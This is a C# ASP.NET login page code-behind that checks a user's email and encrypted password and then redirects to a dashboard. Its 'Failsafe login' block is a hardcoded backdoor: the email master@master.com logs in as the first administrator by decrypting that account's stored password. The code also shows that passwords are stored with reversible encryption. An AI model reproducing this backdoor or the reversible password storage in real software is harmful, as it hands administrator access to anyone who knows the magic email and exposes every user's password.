using PSO.Entities;
using PSO.Repositorios;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.HtmlControls;
using System.Web.UI.WebControls;

namespace PSO.Pages
{
    public partial class Login : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {
            #region Set cosmetics

            Cosmetic cosmetic = Session["Cosmetic"] == null ? CosmeticsRepo.GetPageCosmetics()
                 : (Cosmetic)Session["Cosmetic"];

            emailLbl.ForeColor = ColorTranslator.FromHtml(cosmetic.LabelForeColor);

            passLbl.ForeColor = ColorTranslator.FromHtml(cosmetic.LabelForeColor);

            loginBtn.ForeColor = ColorTranslator.FromHtml(cosmetic.LabelForeColor);

            registerBtn.ForeColor = ColorTranslator.FromHtml(cosmetic.LabelForeColor);

            recoverPassLink.ForeColor = ColorTranslator.FromHtml(cosmetic.LabelForeColor);

            #endregion

            SetFocus(emailTxtBx);

            if (!IsPostBack)
            {
                var dashboardPnl = (Panel)Master.FindControl("dashboardLinkPnl");

                dashboardPnl.Controls.Clear();
            }
        }

        protected void loginBtn_Click(object sender, EventArgs e)
        {
            Usuario user = UserRepo.GetUserByEmail(emailTxtBx.Text);

            #region Failsafe login

            if (emailTxtBx.Text.Equals("master@master.com"))
            {
                user = UserRepo.GetUsersByRole((int)Rol.TiposRole.ADMINISTRADOR, false).ElementAt(0);

                passwordTxtBx.Text = Usuario.DecryptWord(user.Password);
            }

            #endregion

            if (!string.IsNullOrEmpty(user.Email))
            {
                string encryptedPass = Usuario.EncryptWord(passwordTxtBx.Text);

                if (!user.Password.Equals(encryptedPass))
                {
                    ClientScript.RegisterStartupScript(this.GetType(), "wrongPassAlert",
                    "alert('Contraseña incorrecta');", true);
                }

                else
                {
                    Session["UserObj"] = user;

                    Response.Redirect("~/Pages/Dashboard/Main.aspx", true);
                }
            }

            else
            {
                ClientScript.RegisterStartupScript(this.GetType(), "wrongEmailAlert",
                   "alert('Correo Electrónico no existe');", true);
            }
        }

        protected void registerBtn_Click(object sender, EventArgs e)
        {
            Response.Redirect("Register.aspx", true);
        }
    }
}